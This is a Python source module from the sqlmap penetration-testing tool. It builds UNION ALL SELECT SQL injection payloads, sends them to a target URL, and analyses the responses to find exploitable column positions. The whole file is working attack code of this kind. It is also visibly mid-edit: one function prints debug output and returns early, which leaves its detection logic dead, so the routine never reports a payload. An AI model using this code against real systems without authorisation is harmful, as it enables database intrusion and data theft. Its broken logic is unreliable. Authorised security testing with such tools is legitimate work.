#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from lib.core.agent import agent
from lib.core.common import clearConsoleLine
from lib.core.common import dataToStdout
from lib.core.common import Backend
from lib.core.common import extractRegexResult
from lib.core.common import getUnicode
from lib.core.common import parseUnionPage
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.settings import FROM_TABLE
from lib.core.unescaper import unescaper
from lib.parse.html import htmlParser
from lib.request.connect import Connect as Request

def __unionPosition(comment, place, parameter, value, prefix, suffix, count, where=1):
    validPayload = None
    vector = None

    # For each column of the table (# of NULL) perform a request using
    # the UNION ALL SELECT statement to test it the target url is
    # affected by an exploitable inband SQL injection vulnerability
    for position in range(0, count):
        # Prepare expression with delimiters
        randQuery = randomStr()
        phrase = "%s%s%s" % (kb.misc.start, randQuery, kb.misc.stop)
        randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
        randQueryUnescaped = unescaper.unescape(randQueryProcessed)

        # Forge the inband SQL injection request
        query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar)
        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)

        # Perform the request
        resultPage, _ = Request.queryPage(payload, place=place, content=True, raise404=False)

        if resultPage and phrase in resultPage:
            validPayload = payload
            vector = (position, count, comment, prefix, suffix, conf.uChar, where)

            if where == 1:
                # Prepare expression with delimiters
                randQuery2 = randomStr()
                phrase2 = "%s%s%s" % (kb.misc.start, randQuery2, kb.misc.stop)
                randQueryProcessed2 = agent.concatQuery("\'%s\'" % randQuery2)
                randQueryUnescaped2 = unescaper.unescape(randQueryProcessed2)

                # Confirm that it is a full inband SQL injection
                query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar, multipleUnions=randQueryUnescaped2)
                payload = agent.payload(place=place, parameter=parameter, newValue=query, where=2)

                # Perform the request
                resultPage, _ = Request.queryPage(payload, place=place, content=True, raise404=False)

                if resultPage and ((phrase in resultPage and phrase2 not in resultPage) or (phrase not in resultPage and phrase2 in resultPage)):
                    vector = (position, count, comment, prefix, suffix, conf.uChar, 2)

            break

    return validPayload, vector

def __unionConfirm(comment, place, parameter, value, prefix, suffix, count):
    validPayload = None
    vector = None

    # Confirm the inband SQL injection and get the exact column
    # position which can be used to extract data
    validPayload, vector = __unionPosition(comment, place, parameter, value, prefix, suffix, count)

    # Assure that the above function found the exploitable full inband
    # SQL injection position
    if not validPayload:
        validPayload, vector = __unionPosition(comment, place, parameter, value, prefix, suffix, count, where=2)

    return validPayload, vector

def __unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """
    ratios = []
    from lib.core.common import popValue
    from lib.core.common import pushValue
    from lib.request.comparison import comparison
    from lib.core.common import stdev
    from lib.core.common import average
    pushValue(kb.errorIsNone)
    kb.errorIsNone = False
    #for count in range(conf.uColsStart, conf.uColsStop+1):
    for count in range(conf.uColsStart, conf.uColsStop+1):
        query = agent.forgeInbandQuery('', -1, count, comment, prefix, suffix, conf.uChar)
        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=1)
        page, _ = Request.queryPage(payload, place=place, content=True, raise404=False)
        ratios.append(comparison(page, True))
    min_, max_ = min(ratios), max(ratios)

    minIndex = ratios.index(min_)
    maxIndex = ratios.index(max_)
    ratios.pop(ratios.index(min_))
    ratios.pop(ratios.index(max_))
    deviation = stdev(ratios)
    lower, upper = average(ratios) - 7 * deviation, average(ratios) + 7 * deviation
    if min_ < lower:
        print "NULL count is vulnerable: %d" % (minIndex + conf.uColsStart + 1)
        pass
    elif max_ > upper:
        print "NULL count is vulnerable: %d" % (maxIndex + conf.uColsStart + 1)

    kb.errorIsNone = popValue()
    return None, None

    #---------------------------------------------------------

    validPayload = None
    vector = None
    query = agent.prefixQuery("UNION ALL SELECT %s" % conf.uChar)

    for count in range(conf.uColsStart, conf.uColsStop+1):
        if Backend.getIdentifiedDbms() in FROM_TABLE and query.endswith(FROM_TABLE[Backend.getIdentifiedDbms()]):
            query = query[:-len(FROM_TABLE[Backend.getIdentifiedDbms()])]

        if count:
            query += ", %s" % conf.uChar

        if Backend.getIdentifiedDbms() in FROM_TABLE:
            query += FROM_TABLE[Backend.getIdentifiedDbms()]

        status = "%d/%d" % (count, conf.uColsStop)
        debugMsg = "testing %s columns (%d%%)" % (status, round(100.0*count/conf.uColsStop))
        logger.debug(debugMsg)

        validPayload, vector = __unionConfirm(comment, place, parameter, value, prefix, suffix, count)

        if validPayload:
            break

    clearConsoleLine(True)

    return validPayload, vector

def unionTest(comment, place, parameter, value, prefix, suffix):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    if conf.direct:
        return

    kb.technique = PAYLOAD.TECHNIQUE.UNION
    validPayload, vector = __unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)

    if validPayload:
        validPayload = agent.removePayloadDelimiters(validPayload)

    return validPayload, vector
